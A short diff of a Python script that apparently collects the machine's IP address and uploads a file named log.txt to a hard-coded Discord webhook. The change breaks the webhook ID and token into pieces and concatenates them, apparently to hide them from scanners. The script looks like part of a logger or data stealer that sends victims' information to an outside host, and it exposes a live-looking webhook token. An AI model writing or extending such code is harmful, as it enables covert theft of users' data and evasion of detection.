@@ -10,7 +10,11 @@ def GetIP():
         pass
     return ip.replace("\"", "")
 
-webhook = discord.Webhook.partial(930960767501627403, 'pCis-pIRSVgrdnOvOK2p56AcmsvKIeS7TsCL84cJtnBbgPaDMPpIidnG94XiWOBoC7WT', adapter=discord.RequestsWebhookAdapter())
+part1 = '9316956621'
+part2 = '21254972'
+key1 = 'pCis-pIRSVgrdnOvOK2p56AcmsvKIeS7TsCL84cJ'
+key2 = 'tnBbgPaDMPpIidnG94XiWOBoC7WT'
+webhook = discord.Webhook.partial(part1 + part2, key1 + key2, adapter=discord.RequestsWebhookAdapter())
 
 with open(file='log.txt', mode='rb') as f:
     discord_file = discord.File(f)
